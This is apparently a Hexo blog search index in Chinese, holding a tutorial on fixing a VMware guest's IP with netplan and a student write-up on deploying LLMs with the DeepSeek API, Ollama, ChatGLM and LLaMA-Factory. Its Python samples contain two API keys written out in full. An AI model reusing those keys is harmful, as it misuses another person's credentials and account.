<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>固定虚拟机ip地址</title>
      <link href="/2024/10/19/netset/"/>
      <url>/2024/10/19/netset/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>使用xshell远程连接虚拟机时发现ip地址时常发生变化，为了简便配置，故考虑将ip地址固定下来。本文提供了两种方法，分别对应Ubuntu系统和CentOS系统</p><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><p>不论是Ubuntu系统还是CentOS系统，以下操作均适用</p><ul><li><p>打开VMware Workstation,点击左上角 <strong>编辑(E)</strong> -&gt; <strong>虚拟网络编辑器(N)</strong><br><img src="/img/linux/netset-1.png"></p></li><li><p>点击更改设置，以管理员身份打开虚拟网络编辑器<br><img src="/img/linux/netset-2.png"></p></li><li><p>选择 <strong>VMnet8</strong>，按图示操作<br><img src="/img/linux/netset-3.png"></p></li><li><p>点击 <strong>NAT设置</strong><br><img src="/img/linux/netset-4.png"></p></li></ul><h3 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a><strong>Ubuntu</strong></h3><ul><li>ubuntu 20.04</li><li>通过nat设置静态ip</li></ul><h4 id="1-修改文件配置"><a href="#1-修改文件配置" class="headerlink" title="1. 修改文件配置"></a>1. 修改文件配置</h4><p>复制以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/netplan</span><br></pre></td></tr></table></figure><p>进入netplan文件夹下执行<code>ls</code>命令查看当前文件夹下的文件<br><strong>这里可能会有所不同</strong>，笔者执行<code>ls</code>命令后显示当前文件夹下有一个<code>01-network-manager-all.yaml</code>文件，使用vim修改该文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim 01-network-manager-all.yaml</span><br></pre></td></tr></table></figure><p>将以下代码复制到<code>01-network-manager-all.yaml</code>文件内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># Let NetworkManager manage all devices on this system</span><br><span class="line"></span><br><span class="line">network:</span><br><span class="line">  ethernets:</span><br><span class="line">    ens33:</span><br><span class="line">      addresses: [192.168.226.130/24]  # 这里是你要固定的ip地址和掩码</span><br><span class="line">      dhcp4: no</span><br><span class="line">      optional: true</span><br><span class="line">      gateway4: 192.168.226.2       # 这是网关地址</span><br><span class="line">      nameservers:</span><br><span class="line">         addresses: [8.8.8.8,8.8.4.4] </span><br><span class="line">  version: 2</span><br><span class="line">  renderer: networkd </span><br></pre></td></tr></table></figure><p><img src="/img/linux/netset-5.png"><br><strong>注意:</strong> 这里的 <strong>addresses</strong> 请参考准备工作阶段你自己的ip地址, <strong>gateway4</strong>请参考你自己地网关地址，<strong>保存</strong>文件后退出</p><h4 id="2-让配置生效"><a href="#2-让配置生效" class="headerlink" title="2. 让配置生效"></a>2. 让配置生效</h4><p>  输入下面命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> netplan apply</span><br></pre></td></tr></table></figure><h4 id="3-检验是否成功"><a href="#3-检验是否成功" class="headerlink" title="3. 检验是否成功"></a>3. 检验是否成功</h4><p>打开Terminel,执行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure><p>笔者以<code>192.168.226.130</code>为固定IP，若显示如下则配置成功<br><img src="/img/linux/netset-6.png"></p><h3 id="CentOS"><a href="#CentOS" class="headerlink" title="CentOS"></a><strong>CentOS</strong></h3><p>详细方法可参考<a href="https://www.bilibili.com/video/BV1n84y1i7td?spm_id_from=333.788.videopod.episodes&vd_source=1046cf6b20b652e0071d6a870e3b9fdb&p=6">该视频</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大模型部署工作总结</title>
      <link href="/2024/10/16/Bigmodels/"/>
      <url>/2024/10/16/Bigmodels/</url>
      
        <content type="html"><![CDATA[<h2 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h2><p>前期调研智能答疑系统实现的技术路线，提出两种解决方案，一种是直接调用API，一种是本地部署大模型<br><img src="/img/AI_project/models/routine.png"></p><h3 id="调用API方式"><a href="#调用API方式" class="headerlink" title="调用API方式"></a>调用API方式</h3><ol><li>deepseek<br>可以在<a href="https://www.deepseek.com/">deepseek官网</a>上申请免费的API_Key<br>环境要求：<br>python&gt;&#x3D;3.10<br><strong>建议</strong>在Anaconda内创建一个虚拟环境，避免不同库之间的冲突<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create -n 虚拟环境名称 python=3.10 </span><br><span class="line">conda activate 虚拟环境名称  </span><br></pre></td></tr></table></figure>使用方法：<br>I 安装相关依赖<br>pip install openai<br>II 调用API<br>以下是一个简单的python程序</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"></span><br><span class="line">client = OpenAI(api_key=<span class="string">&quot;sk-8b6ffa84471e4539b364df3d5af7fdc6&quot;</span>, base_url=<span class="string">&quot;https://api.deepseek.com&quot;</span>) <span class="comment"># 在deepseek官网申请免费的API</span></span><br><span class="line"></span><br><span class="line">response = client.chat.completions.create(</span><br><span class="line">    model=<span class="string">&quot;deepseek-chat&quot;</span>,</span><br><span class="line">    messages=[</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;什么是SQL注入&quot;</span>&#125;,  <span class="comment"># 在content中修改你的问题</span></span><br><span class="line">    ],</span><br><span class="line">    stream=<span class="literal">False</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.choices[<span class="number">0</span>].message.content)</span><br></pre></td></tr></table></figure><p>以下是由cp提供的更友好的交互方式的python程序</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> openai <span class="keyword">import</span> OpenAI</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">day = datetime.datetime.now().strftime(<span class="string">&quot;%Y-%m-%d&quot;</span>) + <span class="string">&quot;.txt&quot;</span></span><br><span class="line">t = datetime.datetime.now().strftime(<span class="string">&quot;%H-%M-%S&quot;</span>)</span><br><span class="line">logfile = <span class="built_in">open</span>(os.path.join(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, day), <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">logfile.write(t + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">logfile.write(<span class="string">&quot;Chat Start\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://api.deepseek.com&quot;</span></span><br><span class="line">api_key = <span class="string">&quot;sk-6447d4602e0e471093715cff77ffa585&quot;</span></span><br><span class="line">client = OpenAI(api_key=api_key, base_url=url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    user_message = <span class="built_in">input</span>(<span class="string">&quot;User: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user_message == <span class="string">&quot;Q&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;System: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    message=[</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;system&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;You are a helpful assistant&quot;</span>&#125;,</span><br><span class="line">        &#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: user_message&#125;,</span><br><span class="line">    ]</span><br><span class="line">    model = <span class="string">&quot;deepseek-chat&quot;</span>  <span class="comment"># deepseek-chat, deepseek-coder</span></span><br><span class="line">    response = client.chat.completions.create(model=model,messages=message,stream=<span class="literal">False</span>)</span><br><span class="line">    logfile.write(<span class="string">&quot;User: &quot;</span> + user_message + <span class="string">&#x27;\n&#x27;</span> + <span class="string">&quot;System: &quot;</span> + response.choices[<span class="number">0</span>].message.content + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> response.choices[<span class="number">0</span>].message.content:</span><br><span class="line">        <span class="built_in">print</span>(i, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.02</span>)</span><br><span class="line">    <span class="comment"># print(response.choices[0].message.content)</span></span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">logfile.write(<span class="string">&quot;Chat Over\n\n&quot;</span>)</span><br><span class="line">logfile.close()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Chat Over&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li>openai_key<br>在<a href="https://openai.com/">penai官网</a>获取<br> 需要一点<strong>技术和手段</strong>，使用方法请参考官方文档</li></ol><h3 id="本地部署大模型"><a href="#本地部署大模型" class="headerlink" title="本地部署大模型"></a>本地部署大模型</h3><p>在模型选择上，我们主要调研了由清华大学开源的ChatGLM-8b大模型和由Meta开发的LLama3</p><ol><li><strong>模型介绍</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>由 Meta（前 Facebook）开发。</li><li>LLaMA（Large Language Model Meta AI）的目标是提供高效的、可扩展的大型语言模型，并在学术研究和工业应用中得到广泛应用。</li><li>Meta 推出了多个版本，包括 LLaMA 1、LLaMA 2，预计 LLaMA 3 会在这些基础上进一步改进。</li><li>LLaMA 系列模型专注于开放的、多任务处理能力，适合于多种下游任务，如文本生成、翻译、对话、代码生成等。</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>由清华大学 KEG 实验室和 Zhipu.AI 联合开发的中文-英文双语语言模型。</li><li>ChatGLM 专注于中文场景的自然语言处理和对话系统，并提供了双语支持，特别在中文对话场景中有出色的表现。</li><li>ChatGLM 已经有多个版本（ChatGLM-6B、ChatGLM-2 等），其中包含 60 亿参数模型，目标是提供轻量化、高效的对话模型，适合资源受限的环境。</li></ul></li></ul><ol start="2"><li><strong>模型结构与参数</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>LLaMA 模型以其高参数效率闻名，通常在参数量相对较少的情况下也能实现出色的性能。</li><li>LLaMA 系列模型在其压缩和训练技术上有显著创新，使得它们可以在相对较小的计算资源下运行较大的模型。</li><li>预计 LLaMA3 也会延续这些特点，进一步优化推理效率和可扩展性。</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>ChatGLM 模型的版本如 ChatGLM-6B 使用 60 亿参数，虽然参数量较小，但在对话生成和任务处理方面表现出色。</li><li>其设计更注重在有限资源下的推理效率，尤其是适用于中文和双语任务的细微调整，使其成为在资源有限的应用场景中的首选。</li></ul></li></ul><ol start="3"><li><strong>主要技术特点</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>高效的参数化设计，能够在性能和资源消耗之间实现良好的平衡。</li><li>适用于多语言和多任务场景，包括生成、理解、翻译等任务。</li><li>由于 LLaMA 是 Meta 的开源项目，研究人员和开发者可以自由下载和使用这些模型进行开发。</li><li>更大的通用性，能够处理不同类型的语言任务。</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>专门针对中文语言处理进行优化，尤其在中文对话生成和翻译方面有明显优势。</li><li>ChatGLM 提供了跨平台的易用性，在服务器端或本地运行时资源占用较少，因此适合部署到各种硬件环境中。</li><li>ChatGLM 在训练过程中进行了大量的中文语料优化，使得它在处理中文的对话、问答等任务上表现更自然、更符合实际应用需求。</li></ul></li></ul><ol start="4"><li><strong>应用场景</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>适合于多语言、多任务处理，广泛应用于文本生成、机器翻译、总结、问答系统等。</li><li>适合研究机构和企业进行定制化应用，特别是在需要对多个不同任务进行统一处理的情况下。</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>由于其在中文处理方面的优化，ChatGLM 更适合中文对话系统、客服机器人等应用场景。</li><li>在双语应用中表现出色，特别是针对中文和英语之间的翻译与沟通。</li><li>适合企业在中文相关的垂直领域（如客服、智能助手等）进行部署。</li></ul></li></ul><ol start="5"><li><strong>训练数据与性能</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>LLaMA 系列模型使用了大量的多语言语料库进行训练，包括新闻、书籍、代码等不同类型的数据。这使得它在多任务场景下具有良好的迁移能力。</li><li>预计 LLaMA3 在上下文理解、任务生成和知识问答等方面会进一步提升。</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>ChatGLM 的训练数据重点在中文和英语语料，特别加强了对中文场景的优化。</li><li>ChatGLM 在对话流畅度和语境理解方面表现优异，尤其在中文对话任务中的效果比其他许多模型更加自然和一致。</li></ul></li></ul><ol start="6"><li><strong>社区与开源</strong></li></ol><ul><li><p><strong>LLaMA3</strong>:</p><ul><li>LLaMA 系列是开源的，特别受到研究人员和开发者的欢迎。其前几个版本广泛应用于研究和学术领域。</li><li>社区支持广泛，开发者可以轻松访问和微调这些模型。</li></ul></li><li><p><strong>ChatGLM</strong>:</p><ul><li>ChatGLM 也开源，并且有专门针对中文的开发社区支持。</li><li>它的设计更注重轻量化、资源友好型应用，尤其适合想在中文环境中使用 AI 模型的开发者。</li></ul></li></ul><h2 id="技术实现"><a href="#技术实现" class="headerlink" title="技术实现"></a>技术实现</h2><h3 id="1-ollama"><a href="#1-ollama" class="headerlink" title="1. ollama"></a>1. <strong>ollama</strong></h3><p>前往 <strong><a href="https://ollama.com/">ollama官网</a><strong>下载对应版本的服务，以下为</strong>Windows系统</strong>演示<br><img src="/img/AI_project/models/ollama.png"><br><strong>注意</strong>：ollama默认是下载到C盘，后期pull大模型也是默认安装在C盘，如果你想修改存储位置，可参考<a href="https://blog.csdn.net/scj0725/article/details/138087028">这篇文章</a>,添加系统环境变量来解决</p><p>在cmd输入以下命令测试是否安装成功</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama -v</span><br></pre></td></tr></table></figure><p>如果安装成功，返回 **<a href="https://ollama.com/">ollama官网</a>**，点击右上角models查询模型<br><img src="/img/AI_project/models/llama3.1.png"></p><p>可以看到ollama提供非常多种类的模型，这里我们选择llama3.1（读者可以自行尝试其他模型，使用方法一致）<br>点击llama3.1进入模型界面<br><img src="/img/AI_project/models/llama3.1-2.png"><br><strong>注意：</strong> llama3.1提供8B和70B两种数据量的模型，笔者使用的显卡是<strong>NVIDIA 4050</strong>，<strong>显存</strong>约16G，本地跑llama3.1大模型对电脑配置有一定要求，如非企业需求，个人尝试8B数据量的大模型即可适用</p><p>返回命令行，粘贴以下命令</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ollama run llama3.<span class="number">1</span></span><br></pre></td></tr></table></figure><p>至此，你就可以在本地跑自己的大模型啦<br>该方法的不足：</p><ol><li>只能在命令行交互，没有提供<strong>可视化的交互界面</strong></li><li>本地部署大模型对<strong>电脑配置</strong>有一定要求</li><li>只能使用原生模型，不能实现<strong>模型微调</strong></li></ol><h3 id="2-ChatGLM3"><a href="#2-ChatGLM3" class="headerlink" title="2.ChatGLM3"></a>2.<strong>ChatGLM3</strong></h3><p>笔者曾经尝试本地部署ChatGLM3-6B大模型，遇到以下问题<br><img src="/img/AI_project/models/chatglm-1.png"><br><img src="/img/AI_project/models/chatglm-2.png"><br>如果你的操作系统是windows，可能也会遇到类似的问题，即安装相关依赖过程中出现与操作系统冲突的问题<br>最好的解决办法是在<strong>阿里云</strong>或<strong>AutoDL</strong>上租用一台服务器（一键解决环境问题）<br>具体的部署视方法可以参考<a href="https://www.bilibili.com/video/BV1Cx4y1m7Gd/?spm_id_from=333.337.search-card.all.click&vd_source=1046cf6b20b652e0071d6a870e3b9fdb">该视频</a></p><h3 id="3-Llama-factory-Llama3-1"><a href="#3-Llama-factory-Llama3-1" class="headerlink" title="3.Llama-factory+Llama3.1"></a>3.<strong>Llama-factory+Llama3.1</strong></h3><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><ul><li>支持CUDA的GPU，如果没有，可以自行联系远程服务器</li><li>Linux bash环境，如果没有，可以使用虚拟机构建</li><li>能够连接到<a href="https://huggingface.co/">huggingface</a>的网络，用于下载模型，如果没有，需要用其他方法下载（如<a href="https://www.modelscope.cn/home">魔塔社区</a>）</li><li>能够连接<a href="https://github.com/">github</a>的网络，用于下载github仓库</li><li>基础的Linux操作方法</li><li>本文基于基于Ubuntu22.04LTS，相关配置如下<br><img src="/img/AI_project/models/requirement.png"></li></ul><h4 id="使用Anaconda管理包"><a href="#使用Anaconda管理包" class="headerlink" title="使用Anaconda管理包"></a>使用Anaconda管理包</h4><ul><li><p><strong>安装Anaconda</strong><br>Anaconda 环境相较于传统的 pip 包管理来说，可以方便快捷地切换不同环境，如果把 pip 比作把所有的文件都摊到桌面上的笨手笨脚管理员， Anaconda 就像把文件归类放进不同文件夹里的爱干净管理员，这样的文件夹在 Anaconda 中称为“环境”。运行不同的程序所需的依赖不同，有时候会出现冲突，同时需要某个包的不同版本，就可以通过设置不同环境，基于某个环境运行不同程序。<br>安装Anaconda依赖代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libgl1-mesa-glx libegl1-mesa libxrandr2 libxrandr2 libxss1 libxcursor1 libxcomposite1 libasound2 libxi6 libxtst6</span><br></pre></td></tr></table></figure><p>安装Anaconda安装器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先运行这行</span></span><br><span class="line">curl -O https://repo.anaconda.com/archive/Anaconda3-2023.09-0-Linux-x86_64.sh</span><br><span class="line"><span class="comment"># 接着是这行</span></span><br><span class="line">bash ~/Downloads/Anaconda3-2023.09-0-Linux-x86_64.sh</span><br></pre></td></tr></table></figure></li><li><p><strong>创建Anaconda环境</strong><br>创建一个名为LLaMA的环境，使用python3.11</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create -n LLaMA python=3.11</span><br><span class="line"><span class="comment"># 中间会询问你是否 proceed（继续），输入y然后回车即可</span></span><br></pre></td></tr></table></figure><p>激活这个环境<br><strong>注意</strong>：在每次重新登陆的时候，必须输入以下命令激活这个环境，因为你在这个环境中安装了依赖项，否则无法找到依赖项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">conda activate LLaMA</span><br></pre></td></tr></table></figure></li><li><p><strong>安装CUDA</strong><br>CUDA 是 NVIDIA 推出的一种软硬件集成技术，我们都知道显卡通常用于进行图像处理，比如电脑上运行的大型3D游戏，它的流畅程度和帧数都很吃 GPU 的水平，GPU 的特点是可以处理大型并法运算，而这种优势和在机器学习等领域非常有用。CUDA 能让我们利用这种 GPU 的这种特点来加速计算,但是 AMD 的显卡不支持这种技术，所以你需要 NVIDIA 的GPU。</p></li></ul><p>接下来我们来安装 CUDA ，首先查看你的显卡支持的 CUDA 版本，在 bash 命令行输入这行代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvidia-smi </span><br></pre></td></tr></table></figure><p>当前CUDA版本显示在表格最上面的一行，直接前往<a href="https://developer.nvidia.cn/cuda-downloads?target_os=Linux&target_arch=x86_64&Distribution=Ubuntu&target_version=22.04">NVIDIA官网</a>选择对应的操作系统、架构等下载对应的CUDA</p><ul><li><strong>安装PyTorch</strong><br>PyTorch 是一个 Python 程序库，有助于构建深度学习项目。它非常灵活，并允许我们使用深度学习领域惯用的 Python 来表示深度学习模型。它非常便捷，在刚刚创立的时候就吸引了许多使用者，并且在第 1 次发布之后的几年里，它已经成为应用程序中使用最广泛的深度学习工具之一<br> <img src="/img/AI_project/models/cuda.png"><br>直接前往<a href="https://pytorch.org/get-started/locally/">Pytorch官网</a>选择正确版本并下载</li></ul><p>比如我想下载基于linux,pip方法下载python语言，CUDA12.1的就需要运行这行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu121</span><br></pre></td></tr></table></figure><p>(3)安装LLaMA-Factory </p><ul><li><p>clone LLaMA-Factory仓库<br>选择 LLaMA-Factory 因为它支持目前多种模型，集成了许多方法，支持多种精度，并且有非常易用的 webui 界面，对新手非常友好<br>运行以下代码安装LLaMA-Factory</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/hiyouga/LLaMA-Factory.git</span><br><span class="line"><span class="built_in">cd</span> LLaMA-Factory</span><br><span class="line">pip install -e <span class="string">&quot;.[torch,metrics]&quot;</span></span><br></pre></td></tr></table></figure><p>可选的额外依赖项：torch、torch-npu、metrics、deepspeed、bitsandbytes、hqq、eetq、gptq、awq、aqlm、vllm、galore、badam、qwen、modelscope、quality</p></li><li><p>通过远程机器访问webui<br>首先找到<code>LLaMA-Factory/src/llamafactory/webui</code>这个目录，打开interface.py这个文件，将 run_web_ui() 和 run_web_demo() 函数中各自最后一行的launch()函数修改成这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def run_web_ui() -&gt; None:</span><br><span class="line">    gradio_share = os.environ.get(&quot;GRADIO_SHARE&quot;, &quot;0&quot;).lower() in [&quot;true&quot;, &quot;1&quot;]</span><br><span class="line">    server_name = os.environ.get(&quot;GRADIO_SERVER_NAME&quot;, &quot;0.0.0.0&quot;)</span><br><span class="line">    create_ui().queue().launch(share=gradio_share, server_name=server_name, inbrowser=True,server_port=8887)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run_web_demo() -&gt; None:</span><br><span class="line">    gradio_share = os.environ.get(&quot;GRADIO_SHARE&quot;, &quot;0&quot;).lower() in [&quot;true&quot;, &quot;1&quot;]</span><br><span class="line">    server_name = os.environ.get(&quot;GRADIO_SERVER_NAME&quot;, &quot;0.0.0.0&quot;)</span><br><span class="line">    create_web_demo().queue().launch(share=gradio_share, server_name=server_name, inbrowser=True,server_port=8887)</span><br></pre></td></tr></table></figure><p>然后，切换到<code>LLaMA-Factory</code>这个目录，运行以下命令(一定要在<code>LLaMA-Factory</code>路径下运行以下命令，否则找不到对应的数据集)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">llamafactory-cli webui</span><br></pre></td></tr></table></figure><p>最后，开放端口，使其能被远程访问。笔者使用的是AutoDL租用的服务器操作，远程连接方法如下图<br> <img src="/img/AI_project/models/autodl.png"><br><strong>注意</strong>:share&#x3D;True表示允许共享，server_port规定了开启的端口，在这里规定为8887,接着就可以通过远程界面访问 webui 了，记得将0.0.0.0替换成远程主机的ip地址，如果无法连接，查看你远程主机的防火墙配置。</p></li></ul><p> <img src="/img/AI_project/models/data.png"></p><p>如果你成功，恭喜你！现在你可以与自己的大模型进行交互啦<br> <img src="/img/AI_project/models/models.png"></p><p>关于本地部署LLaMA3和模型微调的具体操作可参考<a href="https://www.bilibili.com/video/BV1uw4m1S7Cd/?spm_id_from=333.337.search-card.all.click">该视频</a><br>关于数据集的格式和内容，笔者在项目过程中也遇到了数据来源匮乏、数据质量不高等一系列复杂问题，以下是参考范例和最终效果展示<br><img src="/img/AI_project/models/demo.png"></p><h2 id="大模型结合知识图谱"><a href="#大模型结合知识图谱" class="headerlink" title="大模型结合知识图谱"></a>大模型结合知识图谱</h2><h3 id="1-Maxkb-ollama打造本地知识库"><a href="#1-Maxkb-ollama打造本地知识库" class="headerlink" title="1.Maxkb+ollama打造本地知识库"></a>1.<strong>Maxkb+ollama打造本地知识库</strong></h3><p>具体方法可参考<a href="https://www.bilibili.com/video/BV1an4y1R7HT/?spm_id_from=333.337.search-card.all.click&vd_source=1046cf6b20b652e0071d6a870e3b9fdb">该视频</a><br>以及<a href="https://maxkb.cn/docs/">Maxkb操作手册</a><br><img src="/img/AI_project/models/maxkb.png"><br>效果如下<br><img src="/img/AI_project/models/maxkb-1.png"></p><h3 id="2-AnythingLLM-Ollama"><a href="#2-AnythingLLM-Ollama" class="headerlink" title="2.AnythingLLM+Ollama"></a>2.<strong>AnythingLLM+Ollama</strong></h3><p>具体方法可参考<a href="https://www.bilibili.com/video/BV1FXHze4Ew7/?spm_id_from=333.337.search-card.all.click&vd_source=1046cf6b20b652e0071d6a870e3b9fdb">该视频</a><br>以及<a href="https://anythingllm.com/download">anythingLLA官网</a><br><img src="/img/AI_project/models/anythingLLA.png"><br>效果如下<br><img src="/img/AI_project/models/anythingLLA-1.png"><br>AnythingLLA将提供的文本文档向量化存储在此岸连数据库中，调用时将会检索向量数据库并通过链接成自然语言返回给用户</p><h3 id="3-Langchain-llama"><a href="#3-Langchain-llama" class="headerlink" title="3.Langchain+llama"></a>3.<strong>Langchain+llama</strong></h3><p>具体方法可参考<a href="https://www.bilibili.com/video/BV1t8411y7fp/?spm_id_from=333.337.search-card.all.click&vd_source=1046cf6b20b652e0071d6a870e3b9fdb">该视频</a></p><hr><p><strong>后记</strong></p><p>该项目启动于2024年七月中下旬，依稀记得在那个炎热的暑假，我怀着炽热的心，满怀激情地进入了项目组，期待着和学长学姐一起在项目中学习成长。<br>从最初搭建fay框架的数字人，到立项有明确的任务分工，再到技术路线的调研，模型的选型、部署和微调，一步一步走过来，我收获了很多很多，不仅仅有未知的知识和技能，还有深厚的感情和独特的体验。在此特别感谢陈院长给予的宝贵机会，感谢白学姐给我指导和帮助，感谢小伙伴的陪伴。这是一段浅浅的科研体验，也是一段非常独特的人生体验，好似在我平凡的暑假生活中点亮了一盏灯，指引着我前进。最后，再次衷心感谢这三个月以来老师、学姐和小伙伴的支持与陪伴！</p>]]></content>
      
      
      <categories>
          
          <category> 智能问答系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llama3 </tag>
            
            <tag> ChatGLM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统概论实验（三）</title>
      <link href="/2024/10/15/mysql3/"/>
      <url>/2024/10/15/mysql3/</url>
      
